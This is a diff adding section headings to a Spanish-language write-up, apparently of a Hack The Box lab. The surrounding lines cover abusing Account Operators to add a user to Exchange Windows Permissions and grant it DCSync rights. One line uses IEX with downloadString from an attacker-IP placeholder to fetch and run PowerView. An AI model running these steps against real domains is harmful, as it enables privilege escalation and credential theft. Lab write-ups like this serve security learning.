@@ -40,6 +40,7 @@ Al pertenecer indirectamente al grupo **Account Operators**, la cuenta *svc-alfr
 
 ## **Manos a la obra**
 
+### **Agregando un nuevo usuario a Exchange Windows Permissions**
 Para abusar de esto, primeramente empezaremos creando un usuario y añadirle al dominio.
 
 ```powershell
@@ -78,6 +79,8 @@ net group "Exchange Windows Permissions"
 
 ![net group exchange windows permissions information](/assets/img/net-group-exchange-windows-permissions-information.png)
 
+### **Configurando los permisos DCSync**
+
 En este momento, nos encontramos en el punto en el que deberemos de asignar el privilegio de *DCSync* pero antes, deberemos de configurar las credenciales del usuario con los siguientes comandos.
 
 ```powershell
@@ -114,6 +117,8 @@ IEX(New-Object Net.WebClient).downloadString('http://NUESTRA-IP:8080/PowerView.p
 Gracias a esto, habremos invocado el comando directamente.
 
 ![invocando el comando remotamente](/assets/img/invocando-el-comando-remotamente.png)
+
+### **Efectuando un DCSync**
 
 Ahora sí, podremos ejecutar el comando `Add-DomainObjectAcl` para asignar el privilegio de *DCSync*. Teniendo en cuenta que, nuestro dominio es *htb.local* y nuestro usuario es *hegociv*, deberemos de ejecutar el comando de la siguiente manera. Si tenemos otros datos, modificaremos estos mismos para que adaptarlo a nuestro caso.
 
